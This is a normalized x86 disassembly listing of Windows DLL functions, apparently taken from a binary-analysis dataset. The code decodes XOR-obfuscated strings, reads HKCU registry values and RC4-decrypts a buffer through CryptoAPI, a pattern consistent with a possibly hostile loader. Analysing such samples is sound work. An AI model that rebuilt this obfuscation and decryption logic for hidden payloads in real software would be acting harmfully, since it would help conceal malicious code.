call sub_1000b659
push esi
call sub_1001a026
inc eax
pop ecx
cmp eax 0x3c
jbe r-xdata
push r--data
push ebx
push esi
call sub_10003d4a
add esp 0xc
test eax eax
je r-xdata
push r--data
mov esi 0x314
push esi
push edi
call sub_1004b789
add esp 0xc
test eax eax
jne r-xdata
push esi
call sub_1001a026
lea eax [ eax * 2 + rw-data ]
mov ecx eax
sub ecx esi
push 0x3
sar ecx 0x1
push r--data
sub ebx ecx
push ebx
push eax
call sub_10054118
add esp 0x14
test eax eax
jne r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
push [ ebp - 0x1fc ]
push esi
push edi
call sub_1004b789
add esp 0xc
test eax eax
jne r-xdata
push 0x12010
push r--data
push edi
call sub_10060008
add esp 0xc
jmp r-xdata
sub_1005e750
push ebp
mov ebp esp
push 0xffffffff
push sub_100809d0
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov edi ecx
mov esi [ ebp + 0x8 ]
cmp esi 0x1ffffff
jbe r-xdata
mov eax [ edi + 0x8 ]
sub eax [ edi ]
sar eax 0x7
cmp eax esi
jae r-xdata
push r--data
call sub_100616c6
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov ecx esi
call sub_10046ed0
mov [ ebp - 0x4 ] 0x0
mov ebx [ ebp + 0x8 ]
mov edx [ edi + 0x4 ]
mov ecx [ edi ]
push ebx
push eax
push edx
mov [ ebp - 0x14 ] eax
call sub_1001b650
mov ecx [ edi + 0x4 ]
mov eax [ edi ]
mov ebx ecx
add esp 0xc
sub ebx eax
mov [ ebp - 0x18 ] ecx
test eax eax
je r-xdata
mov eax [ ebp - 0x14 ]
shl esi 0x7
add esi eax
and ebx 0xffffff80
add ebx eax
mov [ edi + 0x8 ] esi
mov [ edi + 0x4 ] ebx
mov [ edi ] eax
mov esi eax
cmp esi ecx
je r-xdata
mov ecx [ edi ]
push ecx
call sub_10065045
mov esi [ ebp + 0x8 ]
add esp 0x4
call sub_10024d10
sub esi 0xffffff80
cmp esi [ ebp - 0x18 ]
jne r-xdata
sub_1005e832
mov edi edi
push ebp
mov ebp esp
push ecx
push edi
xor eax eax
mov [ ebp - 0x4 ] ax
lea edi [ ebp - 0x2 ]
stosw [ edi ]
push 0x2
lea eax [ ebp - 0x4 ]
push eax
push 0x22
call sub_100539e5
push [ eax + 0x14 ]
call [ GetLocaleInfoW@IAT ]
cmp [ ebp - 0x4 ] 0x30
pop edi
jne r-xdata
xor eax eax
cmp [ ebp - 0x4 ] 0x31
jne r-xdata
push 0x2
pop eax
leave
retn
cmp [ ebp - 0x4 ] 0x32
setne al
dec eax
and eax 0x3
leave
retn
inc eax
leave
retn
sub_1005e890
push ebp
mov ebp esp
sub esp 0x18
push esi
push edi
mov [ ebp - 0xc ] 0x0
mov [ ebp - 0x14 ] r--data
mov [ ebp - 0x8 ] 0x0
call [ lstrlenW@IAT ]
lea esi [ eax + eax ]
lea eax [ esi + 0x2 ]
push eax
push 0x40
call [ LocalAlloc@IAT ]
push esi
push edi
push eax
mov [ ebp - 0x10 ] eax
call sub_10078600
mov eax [ ebp + 0x8 ]
add esp 0xc
lea ecx [ ebp - 0x14 ]
push ecx
add eax 0x54
call sub_1002e630
mov eax [ ebp - 0x10 ]
mov esi [ LocalFree@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0xc ]
test eax eax
je r-xdata
push eax
call esi
pop esi
mov esp ebp
pop ebp
retn 0x4
push eax
call esi
sub_1005e900
push ebp
mov ebp esp
push ebx
mov ebx 0x1
test [ rw-data ] bl
jne r-xdata
cmp [ rw-data ] ebx
jne r-xdata
or [ rw-data ] ebx
xor eax eax
push sub_10083090
mov [ rw-data ] 0x7
mov [ rw-data ] 0x0
mov [ rw-data ] ax
call sub_10025945
add esp 0x4
call sub_10056990
test eax eax
jne r-xdata
call sub_1001a7d0
test eax eax
jne r-xdata
mov ecx eax
call sub_100471e0
test eax eax
je r-xdata
mov eax ebx
pop ebx
pop ebp
retn
cmp [ ebp + 0x8 ] eax
je r-xdata
mov [ rw-data ] ebx
mov eax 0x2
pop ebx
pop ebp
retn
xor eax eax
pop ebx
pop ebp
retn
sub_1005e982
push 0x4c
mov eax sub_1007e933
call sub_10007703
mov edi [ ebp + 0x8 ]
and [ ebp - 0x30 ] 0x0
mov ebx [ ebp + 0xc ]
test edi edi
je r-xdata
xor eax eax
inc eax
call sub_10019c00
retn
cmp [ edi ] 0x0
jne r-xdata
push 0x10
call sub_1005ac7e
mov esi eax
pop ecx
mov [ ebp - 0x34 ] esi
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
lea eax [ ebp - 0x2c ]
push eax
mov ecx ebx
call sub_1003b4eb
cmp [ eax + 0x14 ] 0x10
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x30 ] 0x1
jb r-xdata
test [ ebp - 0x30 ] 0x1
je r-xdata
and [ ebp - 0x30 ] 0xfffffffd
lea ecx [ ebp - 0x58 ]
call sub_10062210
push eax
lea ecx [ ebp - 0x58 ]
call sub_100216c0
and [ esi + 0x4 ] 0x0
mov [ ebp - 0x30 ] 0x3
mov [ esi ] r--data
call sub_10044c11
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
mov eax [ eax ]
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_1001c5c0
push 0x2
pop eax
mov [ ebp - 0x4 ] eax
mov [ edi ] esi
test [ ebp - 0x30 ] al
je r-xdata
sub_1005ea40
push ebp
mov ebp esp
sub esp 0x948
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push esi
mov [ ebp - 0x948 ] eax
mov esi edx
mov [ ebp - 0x940 ] ecx
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
mov eax 0x1
pop esi
call sub_1004c3b6
mov esp ebp
pop ebp
retn
test esi esi
je r-xdata
test ecx ecx
je r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
lea edx [ ebp - 0x114 ]
mov eax 0x7
call sub_1001a720
lea edx [ ebp - 0x58 ]
mov eax 0x8
call sub_1001a720
push 0x1
mov ecx edx
push 0x0
lea eax [ ebp - 0x114 ]
mov edx 0x80000001
call sub_10010710
add esp 0x8
test eax eax
je r-xdata
push ebx
push edi
lea edx [ ebp - 0x944 ]
mov eax 0x3
call sub_1001a720
lea edx [ ebp - 0x93c ]
mov eax 0x6
call sub_1001a720
lea edx [ ebp - 0x938 ]
mov eax 0x2
call sub_1001a720
mov edi [ StrStrW@IAT ]
mov eax edx
push eax
push esi
call edi
lea ecx [ ebp - 0x72c ]
test eax eax
mov edx 0x30c
mov eax ecx
je r-xdata
mov eax 0x2
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
xor ebx ebx
sub esi ecx
lea ebx [ ebp - 0x93c ]
xor edi edi
sub ebx ecx
test edx edx
jne r-xdata
movzx ecx [ esi + eax ]
test cx cx
je r-xdata
test edx edx
jne r-xdata
movzx ecx [ ebx + eax ]
test cx cx
je r-xdata
xor edx edx
mov [ eax ] dx
test ebx ebx
je r-xdata
sub eax 0x2
mov ebx 0x8007007a
mov [ eax ] cx
add eax 0x2
dec edx
jne r-xdata
xor edx edx
mov [ eax ] dx
test edi edi
je r-xdata
sub eax 0x2
mov edi 0x8007007a
mov [ eax ] cx
add eax 0x2
dec edx
jne r-xdata
lea eax [ ebp - 0x938 ]
push eax
mov esi 0x30c
lea ebx [ ebp - 0x72c ]
call sub_10030af0
test eax eax
je r-xdata
pop edi
pop ebx
lea eax [ edx + 0x6 ]
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
lea ecx [ edx + 0x7ffffcf2 ]
test ecx ecx
je r-xdata
jmp r-xdata
push esi
mov esi 0x30c
lea ebx [ ebp - 0x72c ]
call sub_10030af0
test eax eax
je r-xdata
pop edi
pop ebx
lea eax [ edx + 0x3 ]
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
lea ecx [ edx + 0x7ffffcf2 ]
test ecx ecx
je r-xdata
jmp r-xdata
mov edx [ ebp - 0x940 ]
lea ecx [ ebp - 0x938 ]
push ecx
push edx
call edi
test eax eax
je r-xdata
pop edi
pop ebx
mov eax 0x7
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x93c ]
push eax
lea ebx [ ebp - 0x72c ]
call sub_10030af0
test eax eax
je r-xdata
pop edi
pop ebx
mov eax 0x4
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x940 ]
push ecx
mov esi 0x30c
lea ebx [ ebp - 0x72c ]
call sub_10030af0
test eax eax
je r-xdata
lea eax [ ebp - 0x93c ]
push eax
lea ebx [ ebp - 0x72c ]
call sub_10030af0
test eax eax
je r-xdata
mov edi [ StrStrW@IAT ]
pop edi
pop ebx
mov eax 0x5
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x940 ]
lea edx [ ebp - 0x938 ]
push edx
push eax
call edi
test eax eax
je r-xdata
pop edi
pop ebx
mov eax 0x9
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
pop edi
pop ebx
mov eax 0x8
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x944 ]
push edx
mov esi 0x30c
lea ebx [ ebp - 0x72c ]
call sub_10030af0
test eax eax
je r-xdata
lea ecx [ ebp - 0x93c ]
push ecx
lea ebx [ ebp - 0x72c ]
call sub_10030af0
test eax eax
je r-xdata
lea eax [ ebp - 0x938 ]
push eax
lea ebx [ ebp - 0x72c ]
call sub_10030af0
test eax eax
je r-xdata
pop edi
pop ebx
mov eax 0xb
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
pop edi
pop ebx
mov eax 0xa
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov ecx [ ebp + 0xc ]
push ecx
lea ebx [ ebp - 0x72c ]
call sub_10030af0
test eax eax
je r-xdata
pop edi
pop ebx
mov eax 0xc
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x3c ]
mov eax 0x4
call sub_1001a720
push 0x3
push edx
lea ecx [ ebp - 0x72c ]
lea eax [ ebp - 0x114 ]
mov edx 0x80000001
call sub_10010710
add esp 0x8
test eax eax
je r-xdata
pop edi
pop ebx
mov eax 0xd
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x10 ]
mov eax 0x1
call sub_1001a720
lea edx [ ebp - 0x78 ]
mov eax 0x5
call sub_1001a720
mov eax edx
push eax
lea ecx [ ebp - 0x114 ]
push ecx
lea edx [ ebp - 0x10 ]
push edx
mov ecx 0x104
lea ebx [ ebp - 0x934 ]
call sub_100254a0
mov ecx [ ebp - 0x948 ]
push 0x1
push 0x0
mov eax ebx
mov edx 0x80000001
call sub_10010710
add esp 0x14
test eax eax
je r-xdata
pop edi
pop ebx
mov eax 0xe
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x24 ]
mov eax 0x9
call sub_1001a720
lea edx [ ebp - 0x98 ]
xor eax eax
call sub_1001a720
mov eax edx
push 0x1
push eax
lea ecx [ ebp - 0x24 ]
lea eax [ ebp - 0x934 ]
mov edx 0x80000001
call sub_10010710
add esp 0x8
neg eax
pop edi
sbb eax eax
pop ebx
and eax 0x10
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
pop edi
pop ebx
mov eax 0xf
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
sub_1005eea0
push ebp
mov ebp esp
push 0xfffffffe
push r--data
push sub_10009180
mov eax [ fs : 0x0 ]
push eax
sub esp 0x244
mov eax [ rw-data ]
xor [ ebp - 0x8 ] eax
xor eax ebp
mov [ ebp - 0x1c ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x18 ] esp
mov esi [ rw-data ]
mov [ ebp - 0x240 ] esi
xor edx edx
mov [ ebp - 0x230 ] edx
xor eax eax
mov ecx [ r--data ]
movsx edi [ ecx + eax ]
xor edi eax
xor edi 0x71
and edi 0xff
mov [ ebp + eax * 2 - 0x30 ] di
inc eax
cmp eax 0x9
jb r-xdata
xor eax eax
mov [ ebp - 0x1e ] ax
mov [ ebp - 0x4 ] edx
mov ecx [ esi + 0x120 ]
mov edx [ ecx + 0x10 ]
mov [ ebp - 0x254 ] edx
lea ebx [ esi + 0xd7c ]
mov [ ebp - 0x244 ] ebx
lea eax [ esi + 0xd5c ]
mov [ ebp - 0x24c ] eax
push eax
mov edi [ lstrlenW@IAT ]
call edi
push ebx
mov ebx eax
call edi
add ebx eax
lea eax [ esi + 0xb4c ]
mov [ ebp - 0x234 ] eax
push eax
call edi
add ebx eax
lea eax [ esi + 0x944 ]
mov [ ebp - 0x23c ] eax
push eax
call edi
add ebx eax
lea eax [ esi + 0x73c ]
mov [ ebp - 0x250 ] eax
push eax
call edi
add ebx eax
lea eax [ esi + 0x124 ]
mov [ ebp - 0x248 ] eax
push eax
call edi
add ebx eax
lea eax [ ebp - 0x30 ]
push eax
call edi
lea edi [ ebx + eax ]
add edi [ ebp - 0x254 ]
mov [ ebp - 0x238 ] edi
mov eax [ esi + 0xda0 ]
cmp eax [ esi + 0xda4 ]
je r-xdata
mov eax [ esi + 0xdb0 ]
cmp eax [ esi + 0xdb4 ]
je r-xdata
add edi [ eax + 0x10 ]
mov [ ebp - 0x238 ] edi
add edi 0x104
mov [ ebp - 0x238 ] edi
lea ecx [ edi + edi ]
push ecx
push 0x8
mov edx [ esi ]
push edx
call [ HeapAlloc@IAT ]
mov [ ebp - 0x230 ] eax
test eax eax
jne r-xdata
add edi [ eax + 0x10 ]
mov [ ebp - 0x238 ] edi
lea edx [ ebp - 0x3c ]
mov eax 0x10
call sub_10036cd0
lea edx [ ebp - 0x22c ]
mov eax 0x1d
call sub_10036cd0
mov eax [ esi + 0xdb0 ]
cmp eax [ esi + 0xdb4 ]
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
jmp r-xdata
cmp [ eax + 0x14 ] 0x8
jb r-xdata
mov ebx r--data
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x1c ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov ebx eax
mov ebx [ eax ]
jmp r-xdata
mov ecx [ esi + 0xda0 ]
cmp ecx [ esi + 0xda4 ]
jne r-xdata
cmp [ ecx + 0x14 ] 0x8
jb r-xdata
mov ecx r--data
jmp r-xdata
cmp [ esi + 0xd58 ] 0x0
lea edx [ ebp - 0x3c ]
jne r-xdata
mov ecx [ ecx ]
mov eax [ esi + 0x120 ]
cmp [ eax + 0x14 ] 0x8
jb r-xdata
lea edx [ ebp - 0x30 ]
push ebx
push ecx
mov ecx [ ebp - 0x244 ]
push ecx
mov ecx [ ebp - 0x24c ]
push ecx
push edx
mov edx [ ebp - 0x234 ]
push edx
mov ecx [ ebp - 0x23c ]
push ecx
mov edx [ ebp - 0x250 ]
push edx
mov ecx [ ebp - 0x248 ]
push ecx
push eax
lea edx [ ebp - 0x22c ]
push edx
mov ecx edi
mov ebx [ ebp - 0x230 ]
call sub_100254a0
add esp 0x2c
jmp r-xdata
mov eax [ eax ]
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x230 ]
sub_1005f0cc
mov esp [ ebp - 0x18 ]
mov eax [ ebp - 0x230 ]
test eax eax
je r-xdata
mov [ ebp - 0x230 ] 0x0
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x230 ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x1c ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
push eax
push 0x0
mov eax [ ebp - 0x240 ]
mov ecx [ eax ]
push ecx
call [ HeapFree@IAT ]
sub_1005f120
push ebp
mov ebp esp
push 0xffffffff
push sub_10081ee1
mov eax [ fs : 0x0 ]
push eax
sub esp 0x31c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
xor edi edi
mov [ ebp - 0x304 ] edi
mov [ ebp - 0x308 ] eax
mov ebx ecx
mov [ ebp - 0x324 ] edi
mov [ ebp - 0x320 ] edi
mov [ ebp - 0x31c ] edi
mov ecx 0x7
mov edx 0x1
mov [ ebp - 0x4 ] edx
xor esi esi
mov [ ebp - 0x2e4 ] ecx
mov [ ebp - 0x2c8 ] ecx
mov [ ebp - 0x2a8 ] ecx
mov [ ebp - 0x28c ] ecx
xor ecx ecx
mov [ ebp - 0x2e8 ] edi
mov [ ebp - 0x2f8 ] si
mov [ ebp - 0x2cc ] edi
mov [ ebp - 0x2dc ] si
mov [ ebp - 0x2ac ] edi
mov [ ebp - 0x2bc ] si
mov [ ebp - 0x290 ] edi
mov [ ebp - 0x2a0 ] cx
mov [ ebp - 0x4 ] 0x2
mov [ eax ] edi
mov [ eax + 0x4 ] edi
mov [ eax + 0x8 ] edi
push edx
mov [ ebp - 0x304 ] edx
push edi
lea edx [ ebp - 0x2fc ]
push edx
mov ecx ebx
mov [ ebp - 0x2fc ] 0x3b
call sub_1001a9f0
mov esi eax
cmp esi 0xffffffff
je r-xdata
mov al [ ebp + 0xc ]
mov ecx [ r--data ]
mov [ ebp - 0x2fc ] al
mov [ ebp - 0x300 ] 0x1
xor eax eax
mov [ ebp - 0x2fc ] 0x3b
jmp r-xdata
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0x3e
and edx 0xff
mov [ ebp + eax * 2 - 0x4c ] dx
inc eax
cmp eax 0x1d
jb r-xdata
mov ecx [ ebp - 0x304 ]
mov ebx [ ebp - 0x324 ]
mov edi [ ebp - 0x320 ]
push ecx
xor eax eax
push ebx
mov ecx edi
mov [ ebp - 0x12 ] ax
call sub_10032600
add esp 0x8
mov esi ebx
mov [ ebp - 0x30c ] ebx
cmp ebx edi
je r-xdata
mov eax esi
sub eax edi
push eax
push edi
push ebx
lea ecx [ ebp - 0x274 ]
mov [ ebp - 0x260 ] 0xf
mov [ ebp - 0x264 ] 0x0
mov [ ebp - 0x274 ] 0x0
call sub_100146b0
lea ecx [ ebp - 0x274 ]
lea edi [ ebp - 0x324 ]
mov [ ebp - 0x4 ] 0x3
call sub_1003e9a0
mov [ ebp - 0x4 ] 0x2
cmp [ ebp - 0x260 ] 0x10
jb r-xdata
lea esi [ ebp - 0x2f8 ]
call sub_10024d10
test ebx ebx
je r-xdata
lea edx [ ebp - 0x2f8 ]
push edx
mov ecx esi
call sub_10052410
add esp 0x4
test eax eax
jne r-xdata
push 0x1
lea edi [ esi + 0x1 ]
push edi
lea edx [ ebp - 0x2fc ]
push edx
mov ecx ebx
call sub_1001a9f0
mov esi eax
cmp esi 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x274 ]
push ecx
call sub_10065045
add esp 0x4
mov eax [ ebp - 0x308 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov esi ebx
cmp ebx edi
je r-xdata
add esi 0x1c
mov [ ebp - 0x30c ] esi
cmp esi edi
jne r-xdata
mov eax [ ebp - 0x300 ]
push eax
lea ecx [ ebp - 0x4c ]
push ecx
mov ecx 0x25
lea ebx [ ebp - 0x258 ]
call sub_100254a0
mov eax ebx
add esp 0x8
lea edx [ eax + 0x2 ]
mov edi edi
push ebx
call sub_10065045
add esp 0x4
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
push eax
lea edx [ ebp - 0x258 ]
push edx
lea ecx [ ebp - 0x2f8 ]
call sub_1005e3c0
mov al [ ebp - 0x2fc ]
mov esi [ ebp - 0x308 ]
mov [ ebp - 0x284 ] al
mov eax [ esi + 0x4 ]
lea ecx [ ebp - 0x2f8 ]
cmp ecx eax
jae r-xdata
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
mov [ esi ] 0x0
add esi 0x1c
cmp esi edi
jne r-xdata
mov edx [ esi ]
push edx
call sub_10065045
add esp 0x4
mov ecx [ esi + 0x8 ]
cmp eax ecx
jne r-xdata
mov edx [ esi ]
cmp edx ecx
ja r-xdata
mov eax [ esi + 0x4 ]
mov [ ebp - 0x314 ] eax
mov [ ebp - 0x310 ] eax
mov [ ebp - 0x4 ] 0x5
test eax eax
je r-xdata
mov edx [ esi ]
sub eax edx
sar eax 0x7
cmp eax 0x1fffffe
ja r-xdata
mov ebx ecx
mov ecx [ esi + 0x8 ]
sub ebx edx
cmp eax ecx
jne r-xdata
inc [ ebp - 0x300 ]
mov [ ebp - 0x4 ] 0x2
sub [ esi + 0x4 ] 0xffffff80
inc [ ebp - 0x2fc ]
mov ebx [ ebp - 0x324 ]
mov edi [ ebp - 0x320 ]
mov esi [ ebp - 0x30c ]
lea edi [ ebp - 0x2f8 ]
push r--data
call sub_100616c6
sub ecx edx
inc eax
sar ecx 0x7
cmp eax ecx
jbe r-xdata
mov eax [ esi + 0x4 ]
and ebx 0xffffff80
add ebx [ esi ]
mov [ ebp - 0x310 ] eax
mov [ ebp - 0x314 ] eax
mov [ ebp - 0x4 ] 0x4
test eax eax
je r-xdata
sub eax edx
sar eax 0x7
cmp eax 0x1fffffe
ja r-xdata
mov edx ecx
shr edx 0x1
mov edi 0x1ffffff
sub edi edx
cmp edi ecx
jae r-xdata
mov edi ebx
jmp r-xdata
sub ecx edx
inc eax
sar ecx 0x7
cmp eax ecx
jbe r-xdata
add ecx edx
xor ecx ecx
jmp r-xdata
push eax
call sub_10005600
mov edx ecx
shr edx 0x1
mov edi 0x1ffffff
sub edi edx
cmp edi ecx
jae r-xdata
push ecx
mov ecx esi
call sub_1005e750
mov ecx eax
cmp ecx eax
jae r-xdata
add ecx edx
xor ecx ecx
jmp r-xdata
push ecx
mov ecx esi
call sub_1005e750
mov ecx eax
cmp ecx eax
jae r-xdata
sub_1005f4f3
push 0x20
mov eax sub_1007eba9
call sub_10007703
mov eax [ ebp + 0x20 ]
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0x24 ]
mov ebx [ ebp + 0x28 ]
push eax
push [ ebp + 0x1c ]
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x2c ]
push eax
call sub_1001d4e2
and [ ebp - 0x4 ] 0x0
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10060ea7
test al al
je r-xdata
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
or [ esi ] 0x1
push 0xffffffff
push 0x0
lea eax [ ebp - 0x2c ]
push eax
mov ecx ebx
call sub_1001c310
or [ esi ] 0x2
jmp r-xdata
mov eax [ ebp + 0xc ]
mov [ edi ] eax
mov eax [ ebp + 0x10 ]
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ edi + 0x4 ] eax
call sub_10024aa0
mov eax edi
call sub_10019c00
retn 0x24
sub_1005f572
push 0x28
mov eax sub_1007e526
call sub_10050d0f
and [ ebp - 0x10 ] 0x0
mov ebx [ ebp + 0x8 ]
test ebx ebx
je r-xdata
push 0x4
pop eax
call sub_1001a1b3
retn
cmp [ ebx ] 0x0
jne r-xdata
push 0x18
call sub_1005ac7e
mov esi eax
pop ecx
mov [ ebp + 0x8 ] esi
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
jne r-xdata
lea ecx [ ebp - 0x34 ]
call sub_10062210
push ecx
lea ecx [ ebp - 0x34 ]
call sub_100216c0
and [ esi + 0x4 ] 0x0
xor ecx ecx
inc ecx
mov [ ebp - 0x10 ] ecx
push ecx
push eax
mov ecx esi
mov [ ebp - 0x4 ] 0x2
mov [ esi ] r--data
call sub_10039ea0
jmp r-xdata
lea ecx [ eax + 0x1c ]
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ ebx ] esi
je r-xdata
sub_1005f608
push ebp
mov ebp esp
sub esp 0x14
push ebx
xor ebx ebx
push ebx
push 0x1
push r--data
push ebx
lea eax [ ebp - 0x4 ]
push eax
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x8 ] 0x3e8
call [ CryptAcquireContextW@IAT ]
test eax eax
jne r-xdata
push esi
mov esi [ ebp + 0x8 ]
push edi
cmp [ ebp + 0x10 ] ebx
jne r-xdata
call [ GetLastError@IAT ]
cmp eax 0x80090016
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
push ebx
push ebx
push 0x8003
push [ ebp - 0x4 ]
call [ CryptCreateHash@IAT ]
test eax eax
je r-xdata
push 0x4
push [ esi ]
mov [ ebp + 0x10 ] ebx
lea ebx [ ebp + 0x10 ]
call sub_10021c50
pop ecx
pop ecx
push [ ebp + 0x10 ]
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
push [ ebp + 0x10 ]
mov ebx eax
mov eax [ esi ]
add eax 0x4
push eax
call sub_10021c50
mov eax [ ebp + 0x10 ]
pop ecx
pop ecx
lea ecx [ ebp - 0x10 ]
push ecx
push 0x0
push 0x0
push eax
push ebx
push [ ebp - 0x4 ]
lea edi [ eax + 0x4 ]
call [ CryptImportKey@IAT ]
test eax eax
je r-xdata
xor eax eax
inc eax
lea eax [ ebp - 0x4 ]
push eax
call sub_1000eb9b
jmp r-xdata
pop edi
pop esi
push ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp - 0xc ]
call [ CryptHashData@IAT ]
test eax eax
je r-xdata
xor ebx ebx
test ebx ebx
je r-xdata
cmp [ ebp - 0xc ] ebx
je r-xdata
cmp eax ebx
jne r-xdata
cmp [ ebp - 0x10 ] ebx
je r-xdata
push [ ebp - 0xc ]
call [ CryptDestroyHash@IAT ]
mov [ ebp - 0xc ] ebx
lea eax [ ebp - 0x10 ]
push eax
push 0x800000
push [ ebp - 0xc ]
push 0x6801
push [ ebp - 0x4 ]
call [ CryptDeriveKey@IAT ]
test eax eax
je r-xdata
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ebx [ esi ]
sub eax edi
push eax
lea eax [ ebx + edi ]
push eax
call sub_10021c50
mov eax [ ebp + 0xc ]
sub [ eax ] edi
pop ecx
pop ecx
xor ebx ebx
jmp r-xdata
push ebx
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
cmp [ ebp - 0x4 ] ebx
je r-xdata
push [ ebp - 0x10 ]
call [ CryptDestroyKey@IAT ]
push 0x3e8
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov edi eax
cmp edi ebx
je r-xdata
xor eax eax
pop ebx
leave
retn 0x10
push ebx
push [ ebp - 0x4 ]
call [ CryptReleaseContext@IAT ]
mov [ ebp + 0x13 ] bl
mov [ ebp + 0x14 ] ebx
mov [ ebp + 0x8 ] ebx
mov eax [ esi ]
add eax [ ebp + 0x8 ]
push [ ebp - 0x8 ]
mov ebx edi
push eax
call sub_10021c50
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x14 ]
push eax
movzx eax [ ebp + 0x13 ]
push edi
push 0x0
push eax
push 0x0
push [ ebp - 0x10 ]
call [ CryptDecrypt@IAT ]
test eax eax
je r-xdata
mov [ ebp + 0x13 ] 0x1
mov [ ebp - 0x8 ] eax
push edi
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
push [ ebp - 0x14 ]
mov ebx [ esi ]
add ebx [ ebp + 0x8 ]
push edi
call sub_10021c50
push [ ebp - 0x8 ]
mov ebx edi
call sub_100111e0
add esp 0xc
cmp [ ebp + 0x13 ] 0x0
jne r-xdata
inc [ ebp + 0x14 ]
add [ ebp + 0x8 ] 0x3e8
jmp r-xdata
